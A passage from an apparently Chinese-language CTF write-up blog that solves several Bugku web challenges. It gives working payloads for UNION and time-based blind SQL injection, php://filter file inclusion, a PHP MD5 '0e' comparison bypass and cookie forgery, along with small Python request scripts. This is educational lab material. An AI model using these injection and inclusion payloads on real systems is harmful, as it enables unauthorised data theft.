style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">62</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print urllib<span style="color:#f92672">.</span>unquote(a<span style="color:#f92672">+</span>b)
</span></span></code></pre></div><p>得到代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkSubmit</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">a</span><span style="color:#f92672">=</span><span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;password&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;undefined&#34;</span><span style="color:#f92672">!=</span><span style="color:#a6e22e">typeof</span> <span style="color:#a6e22e">a</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;67d709b2b54aa2aa648cf6e87a7114f1&#34;</span><span style="color:#f92672">==</span><span style="color:#a6e22e">a</span><span style="color:#f92672">.</span><span style="color:#a6e22e">value</span>)<span style="color:#66d9ef">return</span><span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Error&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">a</span><span style="color:#f92672">.</span><span style="color:#a6e22e">focus</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span><span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">document</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;levelQuest&#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#a6e22e">checkSubmit</span>;
</span></span></code></pre></div><p>可以看出这里已经暴露了password，返回输入即可。</p>
<h2 id="flag在index里面">flag在index里面<a hidden class="anchor" aria-hidden="true" href="#flag在index里面">#</a></h2>
<p>点击链接，看url：file=show.Php，参数file是关键，
本地包含(include)：file=php：//filter/read=convert.base64-encode/resource=index.php,</p>
<p>有关于这些协议的内容要好好看看</p>
<h2 id="输入密码得到flag">输入密码得到flag<a hidden class="anchor" aria-hidden="true" href="#输入密码得到flag">#</a></h2>
<p>用burpsuite直接打</p>
<h2 id="点击一百万次">点击一百万次<a hidden class="anchor" aria-hidden="true" href="#点击一百万次">#</a></h2>
<p>使用hackbar使用post动作：click = 1000001就得到了flag</p>
<h2 id="备份是个好习惯">备份是个好习惯<a hidden class="anchor" aria-hidden="true" href="#备份是个好习惯">#</a></h2>
<h3 id="知识点补充">知识点补充<a hidden class="anchor" aria-hidden="true" href="#知识点补充">#</a></h3>
<p>$_SEVRER函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$SERVER[<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$QUERY_STRING</span><span style="color:#e6db74">&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">//获取查询语句也就是？之后的内容
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$SERBER[<span style="color:#e6db74">&#34;REQUEST_URI&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">//用来获取URL中的路径地址部分（不是url！）例如：http://www.hujuntao.com/index.php?p=3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//$_SERVER[&#39;REQUEST_URI&#39;]获得的就是/index.php?p=3这部分
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#34;HTTP_X_REWRITE_URL&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">//在IIS下功能同上，在apache环境下显示为空
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$SERVER[<span style="color:#e6db74">&#34;SCRIPT_NAME&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">//获取当前脚本的路径，比如“/aaa/index.php”
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>$_SERVER[<span style="color:#e6db74">&#34;PHP_SELF&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">//正在执行的脚本名，比如“/aaa/index.php”
</span></span></span></code></pre></div><p>str function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">strstr</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>], <span style="color:#e6db74">&#39;?&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">//return the string after &#39;?&#39; (include &#39;?&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">substr</span>($str,<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">//return the string after the first symbol
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;key&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$str)
</span></span><span style="display:flex;"><span><span style="color:#75715e">//replace the &#39;key&#39; in str to &#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">parse_str</span>($str)
</span></span><span style="display:flex;"><span><span style="color:#75715e">//parse the str
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">example</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 推荐用法
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">parse_str</span>($str, $output);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $output[<span style="color:#e6db74">&#39;first&#39;</span>];  <span style="color:#75715e">// value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $output[<span style="color:#e6db74">&#39;arr&#39;</span>][<span style="color:#ae81ff">0</span>]; <span style="color:#75715e">// foo bar
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $output[<span style="color:#e6db74">&#39;arr&#39;</span>][<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// baz
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 不建议这么用
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">parse_str</span>($str);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $first;  <span style="color:#75715e">// value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $arr[<span style="color:#ae81ff">0</span>]; <span style="color:#75715e">// foo bar
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> $arr[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// baz
</span></span></span></code></pre></div><p>回到bugku题目：备份是个好习惯</p>
<p>打开界面发现只有一串字符串
搜索index.php.bak可以看到源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Created by PhpStorm.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * User: Norse
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Date: 2017/8/6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Time: 20:22
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#34;display_errors&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$str <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>($_SERVER[<span style="color:#e6db74">&#39;REQUEST_URI&#39;</span>], <span style="color:#e6db74">&#39;?&#39;</span>);<span style="color:#75715e">//get string before &#34;?&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$str <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($str,<span style="color:#ae81ff">1</span>);                      <span style="color:#75715e">//get string after the second symbol
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$str <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;key&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>,$str);          <span style="color:#75715e">//replace &#39;key&#39; to &#39;&#39; in str
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">parse_str</span>($str);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">md5</span>($key1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">md5</span>($key2);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($key1) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($key2) <span style="color:#f92672">&amp;&amp;</span> $key1 <span style="color:#f92672">!==</span> $key2){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $flag<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;取得flag&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>然后分析构造payload，这里有一个知识点，用MD5加密的过程中，如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的数字：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>比较md5(username),md5(password),md5(code)类型和值，双等于存在漏洞的原因其实是，0E开头的MD5值php解析器会解析为numerical strings，在双等于（==）情况下，会先判断类型，识别为numerical strings，会强制转换为数字，所以0e开头的MD5值都为0，所以才能绕过，然而三等于就比较有脾气了，必须一对一的核对两个字符串，不存在什么类型转换问题，所以开头0e相同，后面不同，也就不满足了</p>
<p>所以构造payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>index.php?kkey1=QNKCDZO<span style="color:#960050;background-color:#1e0010">&amp;</span>kkey2=240610708
</span></span></code></pre></div><p>按下回车就得到了flag</p>
<p>另：有一个扫描查看源码泄露的脚本，使用指南和下载地址如下：
<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true">https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true</a></p>
<h2 id="成绩单">成绩单<a hidden class="anchor" aria-hidden="true" href="#成绩单">#</a></h2>
<p>判断是数据库的问题，一开始犯蠢在url框里面写payload。。。。
根据昨天所学的知识，我们先输入1，可以输出成绩单。然后输入1’发现失败，
在尾部添加一个#又可以正常显示了。Emmmm。。。然后由于成绩单里面有三个列，
所以从3开始试试看看到底有几个列。。。。
最终在输入-1’ union select 1,2,3,4#的时候能够显示出内容，由此确定了有四列。</p>
<p>这个地方有点迷：同样是post形式，
在查询框里面输入1’#就可以但是在hackbar里面写id=1‘#就不行，
然而用id=1也是可以正常显示的。。。这个地方很是让我困惑，
后来的payload也是在查询框里面写的。
第二个问题是，同样是注释，为啥#就可以起作用但是&ndash;+就不行，
考虑到题目的类型（水题），感觉不太可能是过滤掉了。。。很迷。。。。</p>
<p>已解决：&ndash;+的‘+’的意思是url中的空格，真实的注释仅仅是&ndash;</p>
<p>做完这一切后就可以开始了：
首先是查到所有数据库的名字
-1’ union select 1,2,group_concat(schema_name),4 from information_schema.schemata#  得到了数据库名字有一个叫做skctf_flag的
接下来，通过数据库名字查找表名
-1’ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’skctf_flag’#		得到了一个叫做fl4g的一个表
接下来通过表明找列名
-1’ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’fl4g’# 得到了一个列名字叫做skctf_flag
最后通过列名找到内容
-1’union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g#
得到flag</p>
<h2 id="cookie欺骗">cookie欺骗<a hidden class="anchor" aria-hidden="true" href="#cookie欺骗">#</a></h2>
<p>看到网址里面filename后面是base64编码的东西，尝试解码看到是keys.txt
改成index.php试一试，然后这里有一个line参数，随便输个1什么的，可以看到有php代码返回
（有一个困惑就是输入0不返回最开始的&lt;?php）然后构造低端脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://123.206.87.240:8002/web11/index.php?line=&#39;</span>
</span></span><span style="display:flex;"><span>url2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&amp;filename=aW5kZXgucGhw&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> para <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">20</span>):
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> url1 <span style="color:#f92672">+</span> repr(para) <span style="color:#f92672">+</span> url2
</span></span><span style="display:flex;"><span>    print(requests<span style="color:#f92672">.</span>get(url)<span style="color:#f92672">.</span>content)
</span></span></code></pre></div><p>得到了以下代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$file<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>])<span style="color:#f92672">?</span>$_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]<span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>$line<span style="color:#f92672">=</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;line&#39;</span>])<span style="color:#f92672">?</span><span style="color:#a6e22e">intval</span>($_GET[<span style="color:#e6db74">&#39;line&#39;</span>])<span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#75715e">//这里应该是base进制转换，line为空的话默认设置为0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>($file<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;location:index.php?line=&amp;filename=a2V5cy50eHQ=&#34;</span>);
</span></span><span style="display:flex;"><span>$file_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;keys.txt&#39;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;index.php&#39;</span>,
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;margin&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_COOKIE[<span style="color:#e6db74">&#39;margin&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;margin&#39;</span>){
</span></span><span style="display:flex;"><span>$file_list[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;keys.php&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($file, $file_list)){
</span></span><span style="display:flex;"><span>$fa <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</span>($file);<span style="color:#75715e">//应该是打开文件的意思，文件应该是在同级目录下
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $fa[$line];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>然后这是别人的获取代码脚本：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://120.24.86.145:8002/web11/index.php&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">20</span>):
</span></span><span style="display:flex;"><span>    payload<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;line&#39;</span>:str(i),<span style="color:#e6db74">&#39;filename&#39;</span>:<span style="color:#e6db74">&#39;aW5kZXgucGhw&#39;</span>}
</span></span><span style="display:flex;"><span>    a<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span>get(url,params<span style="color:#f92672">=</span>payload)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>    content<span style="color:#f92672">=</span>str(a,encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>    print(content)
</span></span></code></pre></div><p>嗯人家的正规很多啊</p>
<p>然后这里就是要post一个cookie，其中的参数是margin=margin,而且要把filename设置为
keys.php的base64编码形式。这个就在burpsuite中操作：</p>
<h2 id="bugku--insert-into">bugku&ndash;insert into<a hidden class="anchor" aria-hidden="true" href="#bugku--insert-into">#</a></h2>
<p>the injection point is as follows:</p>
<blockquote>
<p>$sql=&ldquo;insert into client_ip (ip) values (&rsquo;$ip&rsquo;)&rdquo;;</p>
</blockquote>
<p>the $ip comes from &ldquo;x-forwarded-for&rdquo;</p>
<p>and before this code, the symbol &lsquo;,&rsquo; has been filtered in our input;</p>
<p>payload are as followed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>  <span style="color:#ae81ff">127</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">case</span> <span style="color:#66d9ef">when</span> substr((<span style="color:#66d9ef">select</span> flag <span style="color:#66d9ef">from</span> flag) <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#66d9ef">then</span> sleep(<span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">end</span>)<span style="color:#75715e">-- +
</span></span></span></code></pre></div><blockquote>
<p>the &lsquo;+&rsquo; on the tail is not for annotation,instead it exists for the blank space before
,because the posted data&rsquo;s last space will be ignored ,but adding another symbol after the space
can avoid it.</p>
</blockquote>
<h2 id="never-give-up">never give up<a hidden class="anchor" aria-hidden="true" href="#never-give-up">#</a></h2>
<p>查看源代码，看见注释<!-- raw HTML omitted --></p>
<p>修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到
可能是重定向。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">HTML</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">HEAD</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">SCRIPT</span> <span style="color:#a6e22e">LANGUAGE</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">Words</span> <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">OutWord</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NewWords</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NewWords</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unescape</span>(<span style="color:#a6e22e">Words</span>);<span style="color:#75715e">//unescape()函数可对通过 escape()编码的字符串进行解码。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">NewWords</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">//把东西直接写道html页面里面
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">OutWord</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">// --&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">SCRIPT</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">HEAD</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">BODY</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">BODY</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">HTML</span>&gt;
</span></span></code></pre></div><p>那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。
在python中解码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU
</span></span><span style="display:flex;"><span>zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ
